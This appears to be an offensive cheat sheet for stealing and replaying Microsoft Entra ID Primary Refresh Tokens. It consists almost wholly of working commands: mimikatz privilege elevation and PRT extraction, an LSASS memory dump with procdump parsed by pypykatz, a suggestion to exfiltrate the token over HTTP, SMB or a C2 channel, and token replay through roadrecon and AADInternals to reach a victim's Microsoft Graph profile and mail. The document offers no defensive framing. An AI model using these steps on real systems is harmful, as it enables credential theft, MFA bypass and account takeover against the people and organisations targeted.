# Primary Refresh Tokens PRT Extraction

Original Resource: https://undercodetesting.com/prtxtractor-unleashed-how-attackers-bypass-mfa-by-stealing-entra-id-primary-refresh-tokens-video/

## Mimikatz 

### 1) Elevate to SYSTEM

    mimikatz.exe "privilege::debug" "token::elevate" "exit"

### 2) Extract PRT DPAPI Blob

    mimikatz.exe "privilege::debug" "dpapi::prt /user:target@contoso.com /password:PlaintextPass? /method:logon" "exit"

### 3) Convert PRT to a usable token

AADInternals

    Install-Module AADInternals -Force
    Import-Module AADInternals
    $prtBlob = "<base64 from Mimikatz>"
    $prtJwt = ConvertTo-AADIntPRT -PRTBlob $prtBlob
    $prtJwt | Out-File -FilePath C:\temp\prt.txt

### 4) Exfiltrate prt.txt file 

You can exfiltrate via HTTP upload, SMB, C2 Channel, etc.

## PRTxtractor (Based on the article)

### 1) Dump LSASS process

    procdump -ma lsass.exe lsass.dmp

### 2) Extract PRT from dump with Pypykatz

    pypykatz lsa minidump lsass.dmp > prtdump
    grep "prt" prtdump | grep "PrimaryRefreshToken" prtdump

### 3) Save token to a file

    echo -n "PRT_TOKEN" > prt.jwt

# Token Replay

## Roadrecon

### 1) Install roadrecon

    pip3 install roadrecon

### 2) Authenticate with stolen PRT

    roadrecon auth prt --prt-token "$(cat prt.jwt)" --username target@domain.local

### 3) Request an access token for Microsoft Graph (Example)

    roadrecon token get --resource https://graph.microsoft.com

### 4) Use token

    curl -H "Authorization: Bearer <access_token>" https://graph.microsoft.com/v1.0/me

## AADInternals

### 1) Import Module

    Import-Module AADInternals

### 2) Request access token

    $prt = Get-Content C:\temp\prt.txt
    $accessToken = Get-AADIntAccessTokenForPRT -PRTToken $prt -Resource "https://graph.microsoft.com"

### 3) Use token

    Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/me/messages" -Headers @{Authorization="Bearer $accessToken"}
